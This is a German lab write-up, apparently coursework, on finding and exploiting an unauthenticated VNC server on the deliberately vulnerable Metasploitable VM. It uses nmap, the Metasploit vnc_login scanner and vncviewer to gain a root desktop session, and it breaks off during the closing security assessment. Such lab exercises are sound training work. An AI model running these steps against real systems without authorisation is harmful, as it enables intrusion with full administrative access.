## 1) Ziel der Übung

Ziel dieser Übung ist es, den Remote-Desktop-Dienst **VNC (Virtual Network Computing)** auf der Metasploitable-VM zu analysieren und auszunutzen. Dabei sollen grundlegende Kenntnisse über VNC erarbeitet sowie Werkzeuge wie **nmap** und das **Metasploit Framework** eingesetzt werden. Ziel ist es, eine Schwachstelle im VNC-Dienst zu identifizieren und anschließend eine erfolgreiche Verbindung von Kali Linux zu Metasploitable herzustellen.

---

## 2) Grundlagen: VNC (Virtual Network Computing)

VNC ist ein Protokoll zur grafischen Fernsteuerung von Computern. Es überträgt den Bildschirminhalt eines entfernten Systems und ermöglicht die Steuerung mittels Maus und Tastatur.

Typische Eigenschaften von VNC:

* Plattformunabhängig (Linux, Windows, macOS)
* Standardmäßig Verwendung von TCP-Port **5900**
* Zugriff häufig nur durch Passwort geschützt
* Unsichere Konfigurationen stellen ein hohes Sicherheitsrisiko dar

Auf der Metasploitable-VM ist absichtlich ein unsicher konfigurierter VNC-Server aktiv.

---

## 3) Nmap Scan des VNC-Dienstes

Der Standard-Port für VNC ist TCP-Port **5900**.

### Scan-Befehl:

```sh
nmap -p 5900 --script=vnc-info 192.168.5.51
```

### Ergebnis:

```sh
PORT     STATE SERVICE
5900/tcp open  vnc
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|     None (1)
|_  Desktop name: root@metasploitable
```

### Interpretation:

* Der VNC-Port ist offen
* Es ist **keine Authentifizierung** erforderlich
* Der Desktop läuft unter dem Benutzer **root**

Dies stellt eine kritische Sicherheitslücke dar.

---

## 4) Metasploit – VNC Login Scanner

Zur Überprüfung auf Login-Schwachstellen wird ein Modul aus dem Bereich `auxiliary/scanner/vnc` verwendet.

### Metasploit starten:

```sh
msfconsole
```

### Modul auswählen und konfigurieren:

```sh
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.5.51
set RPORT 5900
run
```

### Ergebnis:

```sh
[*] 192.168.5.51:5900 - VNC server protocol version: 3.3
[+] 192.168.5.51:5900 - Login Successful: No authentication required
```

Das Modul bestätigt, dass der VNC-Zugriff ohne Passwort möglich ist.

---

## 5) Aufbau einer VNC-Verbindung

Da keine Authentifizierung notwendig ist, kann direkt eine Verbindung von Kali Linux zu Metasploitable aufgebaut werden.

### Verbindung mit vncviewer:

```sh
vncviewer 192.168.5.51:5900
```

Nach Ausführung des Befehls öffnet sich eine grafische VNC-Sitzung.

---

## 6) Ergebnis und eingeloggter Benutzer

Nach erfolgreicher Verbindung wird der Desktop der Metasploitable-VM angezeigt.

### Überprüfung des Benutzers:

```sh
whoami
root
```

### Ergebnis:

Der Zugriff erfolgt als Benutzer **root**. Dadurch besteht vollständiger administrativer Zugriff auf das System.

---

## 7) Sicherheitstechnische Bewertung

Der VNC-Dienst auf Metasploitable ist extrem unsicher konfiguriert. Durch das Fehlen einer Authentifizierung kann jeder Angreifer mit Netzwerkzugriff eine grafische Root-Sitzung öffnen. In produktiven Systemen sollte VNC immer durch starke Pass
